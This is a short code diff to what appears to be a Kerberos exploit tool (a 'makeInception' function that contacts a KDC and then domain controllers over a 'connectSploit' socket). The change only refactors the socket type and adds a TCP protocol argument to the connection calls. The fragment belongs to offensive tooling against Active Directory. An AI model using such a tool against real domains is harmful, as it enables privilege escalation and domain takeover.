@@ -201,7 +201,7 @@ int main(int argc, char * argv[])
 
 void makeInception(PKIWI_AUTH_INFOS authInfo, PSID sid, DWORD rid, PGROUP_MEMBERSHIP groups, DWORD cbGroups, PKERB_SID_AND_ATTRIBUTES sids, DWORD cbSids, PCSTR kdc, WORD port, PCSTR filename, PDS_DOMAIN_CONTROLLER_INFO_1 infos, DWORD nbInfos)
 {
-	SOCKET connectSocket, connectSploit;
+	KULL_M_SOCK connectSocket, connectSploit;
 	DWORD i, nb = 0;
 	OssBuf AsReq, TgsReq, TgsReq2;
 	KDC_REP *AsRep, *TgsRep, *TgsRep2;
@@ -210,7 +210,7 @@ void makeInception(PKIWI_AUTH_INFOS authInfo, PSID sid, DWORD rid, PGROUP_MEMBER
 	size_t sF, sN;
 	char * newFilename;
 
-	if(kull_m_sock_initSocket(kdc, port, &connectSocket))
+	if(kull_m_sock_initSocket(kdc, port, IPPROTO_TCP, &connectSocket))
 	{
 		kprintf(" [level 1] Reality       (AS-REQ)\n");
 		if(kull_m_kerberos_asn1_helper_build_AsReq_Generic(authInfo, NULL, NULL, NULL, FALSE, &AsReq))
@@ -238,7 +238,7 @@ void makeInception(PKIWI_AUTH_INFOS authInfo, PSID sid, DWORD rid, PGROUP_MEMBER
 											{
 												infos[i].fIsPdc = FALSE; // not very clean, I know =)
 												kprintf("  * %s : ", infos[i].NetbiosName);
-												if(kull_m_sock_initSocket(infos[i].DnsHostName, port, &connectSploit))
+												if(kull_m_sock_initSocket(infos[i].DnsHostName, port, IPPROTO_TCP, &connectSploit))
 												{
 													if(kull_m_kerberos_helper_net_callKdcOssBuf(&connectSploit, &TgsReq2, (LPVOID *) &TgsRep2, TGS_REP_PDU))
 													{
